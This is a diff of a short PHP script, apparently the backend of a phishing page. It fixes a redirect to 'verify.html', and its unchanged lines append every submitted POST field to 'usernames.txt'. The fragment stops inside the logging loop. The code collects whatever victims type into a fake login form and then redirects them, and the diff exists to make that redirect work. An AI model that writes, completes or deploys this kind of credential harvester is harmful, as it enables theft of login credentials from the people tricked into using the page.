@@ -1,5 +1,5 @@
 <?php
-header (‘Location:http:https:/home/sweaty/Desktop/Desk1/verify.html’);
+header (‘Location:verify.html’);
 $handle = fopen(“usernames.txt”, “a”);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
